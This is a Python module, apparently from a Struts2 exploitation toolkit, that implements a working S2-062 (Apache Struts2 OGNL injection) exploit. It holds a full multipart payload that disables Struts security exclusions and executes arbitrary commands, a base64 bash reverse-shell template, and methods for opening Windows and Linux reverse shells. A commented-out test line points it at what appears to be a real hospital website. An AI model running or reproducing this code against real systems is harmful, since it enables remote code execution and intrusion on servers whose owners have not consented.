import click
from exploit import tools
from lxml import html as lhtml

class S2_062:
    """S2_062漏洞检测利用类"""
    info = "[+] S2-062:该漏洞由于对CVE-2020-17530(s2-061)的修复不完整造成的,影响版本2.0.0 <= Apache Struts2 <= 2.5.29;POST请求发送数据;支持任意命令执行,反弹Windows,Linux shell"
    exec_payload = "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{{}}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{{}}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({{'{cmd}'}}))\r\n}}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):

        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Accept': '*/*',
            'Referer': url,
            'Accept-Encoding': 'gzip,deflate',
            'Connection': 'close',
            'Cookie': 'JSESSIONID=E25862AE388D006049EA9D3CEF12F246',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
            'Content-Length': '877'
        }
        self.get_headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = tools.echo_check(self)
        if html:
            self.is_vul = True
            return 'S2-062'
        return self.is_vul

    def reverse_shell_win(self, ip, port):
        """windows 反弹shell"""
        html = tools.reverse_shell_win(self, ip, port)
        return html

    def exec_cmd(self, cmd):
        # post传值
        payload = self.exec_payload.format(cmd=cmd)
        html = tools.post(self.url, payload, self.headers, self.encoding)
        etree = lhtml.etree
        page = etree.HTML(html)
        try:
            data = page.xpath('//a[@id]/@id')

            if len(data) > 0:
                return f"[+]:{data[0]}"
            else:
                return html
        except Exception as e:
            if str(e).startswith("\'NoneType\'"):
                return html

    def reverse_shell(self, ip, port):
        """Linux 反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_062("http://gzyfymp.med.gzhc365.com/")
#     print(s.check())
#     print(s.exec_cmd("ls -l"))